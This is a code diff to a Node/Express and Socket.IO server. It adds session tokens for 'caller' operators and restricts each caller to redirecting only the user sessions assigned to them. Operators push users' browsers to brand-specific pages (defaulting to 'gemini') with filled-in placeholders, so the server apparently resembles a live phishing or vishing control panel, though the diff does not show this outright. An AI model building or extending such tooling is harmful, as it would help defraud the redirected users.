@@ -32,6 +32,7 @@ const execAsync = promisify(exec);
 import dotenv from 'dotenv';
 dotenv.config();
 import { callerManager } from './services/callerManager.js';
+import { callerSessionManager } from './services/callerSessionManager.js';
 import { aliasManager } from './services/aliasManager.js';
 
 
@@ -1207,7 +1208,48 @@ app.get('/', async (req, res, next) => {
 
 
 
- // Caller authentication endpoint
+ // Validate caller session token endpoint
+app.post('/api/auth/validate-token', (req, res) => {
+    const { token } = req.body;
+
+    if (!token) {
+        return res.status(400).json({
+            success: false,
+            error: 'Token required'
+        });
+    }
+
+    const session = callerSessionManager.validateSession(token);
+
+    if (session) {
+        // Get caller data
+        const caller = callerManager.getCallerByUsername(session.username);
+        if (caller) {
+            res.json({
+                success: true,
+                user: {
+                    id: caller.id,
+                    username: caller.username,
+                    role: 'caller'
+                }
+            });
+        } else {
+            // Caller was deleted
+            callerSessionManager.revokeSession(token);
+            res.status(401).json({
+                success: false,
+                error: 'User no longer exists'
+            });
+        }
+    } else {
+        res.status(401).json({
+            success: false,
+            error: 'Invalid or expired token'
+        });
+    }
+});
+
+// Caller authentication endpoint
 app.post('/api/auth/caller', (req, res) => {
     const { username, password } = req.body;
 
@@ -1221,9 +1263,13 @@ app.post('/api/auth/caller', (req, res) => {
     const result = callerManager.verifyCaller(username, password);
 
     if (result.success) {
+        // Create a persistent session token
+        const token = callerSessionManager.createSession(result.caller.id, result.caller.username);
+
         res.json({
             success: true,
-            user: result.caller
+            user: result.caller,
+            token: token
         });
     } else {
         res.status(401).json({
@@ -1972,9 +2018,35 @@ adminNamespace.use((socket, next) => {
     const userRole = socket.handshake.auth.role;
     const username = socket.handshake.auth.username;
 
-    // Allow both admin and caller connections
-    if (verifyAdmin(token) || userRole === 'caller') {
-        socket.userRole = userRole || 'admin';
+    // Check if it's an admin token
+    if (verifyAdmin(token)) {
+        socket.userRole = 'admin';
+        socket.username = username || 'admin';
+        next();
+    }
+    // Check if it's a caller with a session token
+    else if (userRole === 'caller' && token) {
+        const session = callerSessionManager.validateSession(token);
+        if (session) {
+            // Verify caller still exists
+            const caller = callerManager.getCallerByUsername(session.username);
+            if (caller) {
+                socket.userRole = 'caller';
+                socket.username = session.username;
+                socket.callerId = session.callerId;
+                next();
+            } else {
+                // Caller was deleted
+                callerSessionManager.revokeSession(token);
+                next(new Error('User no longer exists'));
+            }
+        } else {
+            next(new Error('Invalid or expired session'));
+        }
+    }
+    // Legacy support for callers without token (will be removed)
+    else if (userRole === 'caller' && username) {
+        socket.userRole = 'caller';
         socket.username = username;
         next();
     } else {
@@ -2054,7 +2126,24 @@ adminNamespace.on('connection', (socket) => {
     });
 
     socket.on('redirect_user', ({ sessionId, page, placeholders }) => {
-        console.log(`[REDIRECT] Attempting to redirect session ${sessionId} to ${page}`);
+        console.log(`[REDIRECT] Attempting to redirect session ${sessionId} to ${page} by ${socket.userRole} (${socket.username || 'admin'})`);
+
+        // Permission check: callers can only redirect their assigned sessions
+        const session = sessionManager.getSession(sessionId);
+        if (!session) {
+            console.log(`[REDIRECT] Session ${sessionId} not found`);
+            return;
+        }
+
+        if (socket.userRole === 'caller' && session.assignedTo !== socket.username) {
+            console.log(`[REDIRECT] Caller ${socket.username} not authorized to redirect session ${sessionId} (assigned to: ${session.assignedTo})`);
+            socket.emit('redirect_error', {
+                error: 'You can only redirect sessions assigned to you',
+                sessionId
+            });
+            return;
+        }
+
         const sockets = Array.from(userNamespace.sockets.values());
         console.log(`[REDIRECT] Found ${sockets.length} connected user sockets`);
 
@@ -2062,52 +2151,47 @@ adminNamespace.on('connection', (socket) => {
 
         if (targetSocket) {
             console.log(`[REDIRECT] Found target socket for session ${sessionId}`);
-            const session = sessionManager.getSession(sessionId);
-            if (session) {
-                // Clear any existing timeout
-                const existingTimeout = loadingTimeouts.get(sessionId);
-                if (existingTimeout) {
-                    clearTimeout(existingTimeout);
+            // Clear any existing timeout
+            const existingTimeout = loadingTimeouts.get(sessionId);
+            if (existingTimeout) {
+                clearTimeout(existingTimeout);
+            }
+
+            // Store placeholders if provided
+            if (placeholders && Object.keys(placeholders).length > 0) {
+                session.placeholders = placeholders;
+            }
+
+            session.loading = true;
+            session.connected = true;
+            session.lastHeartbeat = Date.now();
+            adminNamespace.emit('session_updated', session);
+
+            // Set new loading timeout
+            const timeout = setTimeout(() => {
+                const currentSession = sessionManager.getSession(sessionId);
+                if (currentSession && currentSession.loading) {
+                    currentSession.loading = false;
+                    currentSession.connected = false;
+                    adminNamespace.emit('session_updated', currentSession);
                 }
+                loadingTimeouts.delete(sessionId);
+            }, 5000);
 
-                // Store placeholders if provided
-                if (placeholders && Object.keys(placeholders).length > 0) {
-                    session.placeholders = placeholders;
-                }
+            loadingTimeouts.set(sessionId, timeout);
 
-                session.loading = true;
-                session.connected = true;
-                session.lastHeartbeat = Date.now();
-                adminNamespace.emit('session_updated', session);
+            // Use the page mapping to resolve the correct file name
+            const brand = session.brand || 'gemini';
+            const resolvedPageName = resolvePageName(brand, page);
 
-                // Set new loading timeout
-                const timeout = setTimeout(() => {
-                    const currentSession = sessionManager.getSession(sessionId);
-                    if (currentSession && currentSession.loading) {
-                        currentSession.loading = false;
-                        currentSession.connected = false;
-                        adminNamespace.emit('session_updated', currentSession);
-                    }
-                    loadingTimeouts.delete(sessionId);
-                }, 5000);
+            session.currentPage = resolvedPageName;
+            const newUrl = sessionManager.updateSessionUrl(session);
 
-                loadingTimeouts.set(sessionId, timeout);
-
-                // Use the page mapping to resolve the correct file name
-                const brand = session.brand || 'gemini';
-                const resolvedPageName = resolvePageName(brand, page);
-
-                session.currentPage = resolvedPageName;
-                const newUrl = sessionManager.updateSessionUrl(session);
-
-                if (newUrl) {
-                    console.log(`[REDIRECT] Sending redirect to ${newUrl}`);
-                    targetSocket.emit('redirect', newUrl);
-                } else {
-                    console.log(`[REDIRECT] Failed to generate redirect URL`);
-                }
+            if (newUrl) {
+                console.log(`[REDIRECT] Sending redirect to ${newUrl} for ${socket.userRole} ${socket.username || 'admin'}`);
+                targetSocket.emit('redirect', newUrl);
             } else {
-                console.log(`[REDIRECT] Session ${sessionId} not found`);
+                console.log(`[REDIRECT] Failed to generate redirect URL`);
             }
         } else {
             console.log(`[REDIRECT] No socket found for session ${sessionId}`);
@@ -2291,6 +2375,12 @@ adminNamespace.on('connection', (socket) => {
             if (callerToDelete) {
                 // Delete the caller from database
                 callerManager.deleteCaller(id);
+
+                // Revoke all persistent session tokens for this caller
+                const revokedCount = callerSessionManager.revokeAllSessionsForCaller(id);
+                if (revokedCount > 0) {
+                    console.log(`Revoked ${revokedCount} session tokens for caller: ${callerToDelete.username}`);
+                }
 
                 // Force logout all active sessions for this caller
                 const callerSessions = activeCallerSessions.get(callerToDelete.username);
